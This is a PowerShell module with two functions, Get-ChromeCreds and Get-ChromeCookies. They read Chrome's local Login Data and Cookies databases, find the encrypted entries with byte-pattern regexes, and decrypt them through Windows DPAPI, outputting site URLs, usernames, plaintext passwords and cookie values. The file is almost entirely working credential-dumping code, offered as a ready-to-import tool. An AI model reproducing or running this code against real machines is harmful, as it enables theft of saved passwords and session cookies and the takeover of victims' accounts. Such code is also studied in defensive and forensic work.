# Instructions: import the module, then perform the commanded needed.
# Currently only supports Chrome credential extraction, more to come!

# Chrome Credential Extraction
# Use: Get-ChromeCreds [path to Login Data]
# Path is optional, use if automatic search doesn't work

function Get-ChromeCreds() {
	Param(
		[String]$Path
	)

	if ([String]::IsNullOrEmpty($Path)) {
		$Path = "$env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\Login Data"
	}

	if (![system.io.file]::Exists($Path))
	{
		Write-Error 'Chrome db file doesnt exist, or invalid file path specified.'
		Break
	}

	Add-Type -AssemblyName System.Security
	# Credit to Matt Graber for his technique on using regular expressions to search for binary data
	$Stream = New-Object IO.FileStream -ArgumentList "$Path", 'Open', 'Read', 'ReadWrite'
	$Encoding = [system.Text.Encoding]::GetEncoding(28591)
	$StreamReader = New-Object IO.StreamReader -ArgumentList $Stream, $Encoding
	$BinaryText = $StreamReader.ReadToEnd()
	$StreamReader.Close()
	$Stream.Close()

	# First the magic bytes for the password. Ends using the "http" for the next entry.
	$PwdRegex = [Regex] '(\x01\x00\x00\x00\xD0\x8C\x9D\xDF\x01\x15\xD1\x11\x8C\x7A\x00\xC0\x4F\xC2\x97\xEB\x01\x00\x00\x00)[\s\S]*?(?=\x68\x74\x74\x70|\Z)'
	$PwdMatches = $PwdRegex.Matches($BinaryText)
	$PwdNum = 0
	$DecPwdArray = @()
	$PwdMatchCount = $PwdMatches.Count
	
	# Decrypt the password macthes and put them in an array
	Foreach ($Pwd in $PwdMatches) {
		$Pwd = $Encoding.GetBytes($PwdMatches[$PwdNum])
		$Decrypt = [System.Security.Cryptography.ProtectedData]::Unprotect($Pwd,$null,[System.Security.Cryptography.DataProtectionScope]::CurrentUser)
		$DecPwd = [System.Text.Encoding]::Default.GetString($Decrypt)
		$DecPwdArray += $DecPwd
		$PwdNum += 1
	}

	# Now the magic bytes for URLs/Users. Look behind here is the look ahead for passwords.
	$UserRegex = [Regex] '(?<=\x0D\x0D\x0D[\s\S]{2}\x68\x74\x74\x70)[\s\S]*?(?=\x01\x00\x00\x00\xD0\x8C\x9D\xDF\x01\x15\xD1\x11\x8C\x7A\x00\xC0\x4F\xC2\x97\xEB\x01\x00\x00\x00)'
	$UserMatches = $UserRegex.Matches($BinaryText)
	$UserNum = 0
	$UserMatchCount = $UserMatches.Count
	$UserArray = @()
	
	# Check to see if number of users matches the number of passwords. If the values are different, very likely that there was a regex mismatch.
	# All returned values should be treated with caution if this error is presented. May be out of order.
	
	if (-NOT ($UserMatchCount -eq $PwdMatchCount)) { 
	$Mismatch = [string]"The number of users is different than the number of passwords! This is most likely due to a regex mismatch."
	Write-Error $Mismatch
	}
	
	# Add back the "http" used in the regex lookahead
	$HTTP = "http"
	# Put the URL/User matches into an array
	Foreach ($User in $UserMatches) {
		$User = $Encoding.GetBytes($UserMatches[$UserNum])
		$User = $HTTPEnc + $User
		$UserString = [System.Text.Encoding]::Default.GetString($User)
		$UserString = $HTTP + $UserString
		$UserArray += $UserString
		$UserNum += 1
	}
	
	# Now create an object to store the previously created arrays
	$ArrayFinal = New-Object -TypeName System.Collections.ArrayList
	for ($i = 0; $i -lt $UserNum; $i++) {
		$ObjectProp = @{
			UserURL = $UserArray[$i]
			Password = $DecPwdArray[$i]
		}
	
		$obj = New-Object PSObject -Property $ObjectProp
		$ArrayFinal.Add($obj) | Out-Null
	}
	$ArrayFinal
}

# Chrome Cookie Extraction
# Use: Get-ChromeCookies [path to Cookies]
# Path is optional, use if automatic search doesn't work

function Get-ChromeCookies() {
	Param(
		[String]$Path
	)

	if ([String]::IsNullOrEmpty($Path)) {
		$Path = "$env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\Cookies"
	}

	if (![system.io.file]::Exists($Path))
	{
		Write-Error 'Chrome db file doesnt exist, or invalid file path specified.'
		Break
	}
	Add-Type -AssemblyName System.Security
	# Credit to Matt Graber for his technique on using regular expressions to search for binary data
	$Stream = New-Object IO.FileStream -ArgumentList $Path, 'Open', 'Read', 'ReadWrite'
	$Encoding = [system.Text.Encoding]::GetEncoding(28591)
	$StreamReader = New-Object IO.StreamReader -ArgumentList $Stream, $Encoding
	$BinaryText = $StreamReader.ReadToEnd()
	$StreamReader.Close()
	$Stream.Close()

	# Regex for the encrypted blob. Starting bytes were easy, but the terminating bytes were tricky. Four different scenarios are covered.
	$BlobRegex = [Regex] '(\x01\x00\x00\x00\xD0\x8C\x9D\xDF\x01\x15\xD1\x11\x8C\x7A\x00\xC0\x4F\xC2\x97\xEB\x01\x00\x00\x00)[\s\S]*?(?=[\s\S]{2}\x97[\s\S]{8}\x00[\s\S]{2}\x0D|\x0D[\s\S]{2}\x00[\s\S]{3}\x00\x02|\x00{20}|\Z)'
	$BlobMatches = $BlobRegex.Matches($BinaryText)
	$BlobNum = 0
	$DecBlobArray = @()
	$BlobMatchCount = $BlobMatches.Count

	# Attempt to decrypt the blob. If it fails, a null byte is added to the end.
	# If it fails again, most likely due to non-contiguous storage. The blob value will be changed.
	# Then puts results into an array.
	
	Foreach ($Blob in $BlobMatches) {
		$Blob = $Encoding.GetBytes($BlobMatches[$BlobNum])
		try {
			$Decrypt = [System.Security.Cryptography.ProtectedData]::Unprotect($Blob,$null,[System.Security.Cryptography.DataProtectionScope]::CurrentUser)
		}
		catch { 
			$Blob = $Blob + " 0"
			try { 
				$Decrypt = [System.Security.Cryptography.ProtectedData]::Unprotect($Blob,$null,[System.Security.Cryptography.DataProtectionScope]::CurrentUser)
			}
			catch { 
				$Decrypt = [string]"Unable to decrypt blob"
				$DecBlob = [string]"Unable to decrypt blob"
				$Error = [string]"Unable to decrypt blob. The value of the cookie will be changed to (Unable to decrypt blob)."
				Write-Error $Error
			}	
		}
		$DecBlob = [System.Text.Encoding]::Default.GetString($Decrypt)
		$DecBlobArray += $DecBlob
		$BlobNum += 1
	}

	# Regex for cookie hostname, name, and path, in that order. Inital magic bytes were very tricky. Reads until a null byte value is found.
	
	$CookieRegex = [Regex] '(?<=\x97[\s\S]{8}\x00[\s\S]{2}\x0D[\s\S]{11,12})[\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x2d\x21\x20\x22\x20\x23\x20\x24\x20\x25\x20\x26\x20\x27\x20\x28\x20\x29\x20\x2a\x20\x2b\x2d\x20\x2e\x20\x2f\x3a\x3c\x20\x3d\x20\x3e\x20\x3f\x20\x40\x5b\x20\x5c\x20\x5d\x20\x5e\x20\x5f\x20\x60\x7b\x20\x7c\x20\x7d\x20\x7e\x2c]{3,}?(?=[\x00\x01\x02\x03])'
	$CookieMatches = $CookieRegex.Matches($BinaryText)
	$CookieMatchCount = $CookieMatches.Count

	# Check to see if number of cookies matches the number of encrypted blobs. If the values are different, very likely that there was a regex mismatch.
	# All returned values should be treated with caution if this error is presented. May be out of order.
	
	if (-NOT ($CookieMatchCount -eq $BlobMatchCount)) { 
		$Mismatch = [string]"The number of cookies is different than the number of encrypted blobs! This is most likely due to a regex mismatch."
		Write-Error $Mismatch
	}

	# Put cookies into an array.
	
	$CookieNum = 0
	$CookieArray = @()
	Foreach ($Cookie in $CookieMatches) {
		$Cookie = $Encoding.GetBytes($CookieMatches[$CookieNum])
		$CookieString = [System.Text.Encoding]::Default.GetString($Cookie)
		$CookieArray += $CookieString
		$CookieNum += 1
	}

	# Now create an object to store the previously created arrays.
	
	$ArrayFinal = New-Object -TypeName System.Collections.ArrayList
	for ($i = 0; $i -lt $CookieNum; $i++) {
		$ObjectProp = @{
			Blob = $DecBlobArray[$i]
			Cookie = $CookieArray[$i]
		}
	
		$obj = New-Object PSObject -Property $ObjectProp
		$ArrayFinal.Add($obj) | Out-Null
	}
	$ArrayFinal
}
